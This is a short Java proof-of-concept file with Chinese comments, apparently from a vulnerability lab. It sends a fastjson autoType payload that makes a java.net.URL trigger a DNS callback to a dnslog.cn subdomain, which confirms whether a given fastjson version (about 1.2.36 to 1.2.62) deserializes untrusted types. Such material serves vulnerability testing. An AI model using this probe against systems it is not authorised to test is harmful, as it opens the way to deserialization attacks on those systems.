package vul.fastjson;

import com.alibaba.fastjson.JSON;

/**
 * @ClassName: urldns
 * @Description: TODO 修改pom.xml中版本号为 1.2.47 并重新导入
 * @Author: Summer
 * @Date: 2020/7/8 13:55
 * @Version: v1.0.0
 * @Description: urldns通常用来作为检验漏洞存在
 **/
public class urldns {
    public static void main(String[] args) {

        // dnslog平台网站：http://www.dnslog.cn/
        // TODO 修改pom.xml  1.2.36 < fastjson < 1.2.62
        String payload = "{{\"@type\":\"java.net.URL\",\"val\"" +
                ":\"http://pvjzft.dnslog.cn\"}:\"summer\"}";
        // 实测fastjson<=1.2.36就无法用urldns检测
        // 1.2.36之前DefaultJSONParser.class中410行中的 object.put(key, value);
        // 其中的key是一个string字符串
//        大于1.2.36 map.put(key, value); 其中key是已经是被实例化URL类对象
        JSON.parse(payload);


    }

}
